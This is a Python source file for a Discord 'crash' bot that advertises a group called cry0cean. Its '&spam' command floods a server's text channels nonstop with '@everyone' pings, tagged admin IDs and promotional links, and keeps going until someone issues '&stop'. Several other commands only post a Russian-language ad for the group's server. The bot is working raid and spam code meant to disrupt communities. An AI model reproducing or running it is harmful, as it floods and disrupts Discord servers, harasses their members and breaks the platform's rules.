import discord
import time
from discord.ext import commands
from discord import utils
from discord.ext import tasks
import random
import asyncio
from discord.ext.commands import has_permissions, CheckFailure, has_role
import json
import datetime

with open('config.json', 'r') as f:
    config = json.load(f)
token = config['token']
intents = discord.Intents.default()
intents.members = True
client = commands.Bot(command_prefix='&', intents = intents)

admin_ids = [286606307677569024,819996626684346408]
tagAdmins = ' '.join([f"<@{adminId}>" for adminId in admin_ids])
spamThreads = []

@client.command(aliases = ['spam'])
async def spamChannels(ctx):
    await client.wait_until_ready()
    if ctx.message.guild.id in spamThreads:
        return
    spamThreads.append(ctx.message.guild.id)
    while not client.is_closed():
        if ctx.message.guild.id not in spamThreads:
            return
        channels = ctx.message.guild.text_channels
        try:
            text = f'**Crash by cry0cean.xyz team.\n**{tagAdmins}\nhttps://t.me/requiemcrash \nhttps://cry0cean.xyz/'
            channel = random.choice(list(channel for channel in channels))
            await channel.send("@everyone https://cry0cean.xyz/discord " + text)

            
        except discord.errors.NotFound:
            pass

@client.command()
async def stop(ctx):
    if ctx.message.guild.id in spamThreads:
        spamThreads.remove(ctx.message.guild.id)
        await ctx.send("Crash stopped.")
    return
@client.command()
async def destroy(ctx):
    await ctx.send("Эта функция, и другие крутые функции доступны на нашем сервере: https://cry0cean.xyz/discord")

@client.command()
async def channels(ctx):
    await ctx.send("Эта функция, и другие крутые функции доступны на нашем сервере: https://cry0cean.xyz/discord")

@client.command()
async def delchannels(ctx):
    await ctx.send("Эта функция, и другие крутые функции доступны на нашем сервере: https://cry0cean.xyz/discord")

@client.command(aliases=['enable-safe'])
async def enablesafe(ctx):
    await ctx.send("Эта функция, и другие крутые функции доступны на нашем сервере: https://cry0cean.xyz/discord")
@client.command(aliases=['disable-safe'])
async def disablesafe(ctx):
    await ctx.send("Эта функция, и другие крутые функции доступны на нашем сервере: https://cry0cean.xyz/discord")
@client.command()
async def ping(ctx):
    await ctx.send("Эта функция, и другие крутые функции доступны на нашем сервере: https://cry0cean.xyz/discord")

client.run(token)